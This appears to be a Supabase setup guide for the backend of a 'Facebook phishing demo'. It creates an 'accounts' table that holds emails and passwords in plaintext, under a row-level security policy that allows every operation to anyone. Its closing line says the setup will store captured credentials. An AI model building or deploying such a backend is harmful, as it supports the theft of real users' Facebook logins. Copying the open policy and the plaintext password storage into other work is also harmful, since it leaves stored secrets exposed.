# Supabase Setup Guide

## Required: Create the "accounts" table in your Supabase project

### Step 1: Access your Supabase Dashboard
1. Go to https://supabase.com
2. Sign in to your account
3. Navigate to your project: https://dhigeugkmnknsdykmclg.supabase.co/project/17452241

### Step 2: Create the "accounts" table
1. Go to **Database** → **Table Editor**
2. Click **New table**
3. Table name: `accounts`
4. Add these columns:
   - `id` (UUID) - Primary Key, Default: `gen_random_uuid()`
   - `email` (text)
   - `password` (text)
5. Click **Save**

### Step 3: Set up Row Level Security (RLS)
1. Go to **Database** → **Authentication** → **Policies**
2. For the `accounts` table, click **Enable RLS**
3. Create a new policy:
   - Policy name: `Allow all operations`
   - Definition: `true`
   - Permissions: Enable INSERT, SELECT, UPDATE, DELETE

### Step 4: Test the setup
Open `test-supabase.html` in your browser and click the test buttons to verify:
- ✅ Connection works
- ✅ Data can be inserted
- ✅ Data can be retrieved

## Alternative: Use the SQL Editor

Run this SQL in **Database** → **SQL Editor**:

```sql
-- Create the accounts table
CREATE TABLE IF NOT EXISTS accounts (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    email TEXT NOT NULL,
    password TEXT NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Enable Row Level Security
ALTER TABLE accounts ENABLE ROW LEVEL SECURITY;

-- Create policy to allow all operations
CREATE POLICY "Allow all operations" ON accounts
FOR ALL USING (true);
```

## After Setup
Once the table is created and RLS is configured, your Facebook phishing demo will work correctly and store credentials in your Supabase database.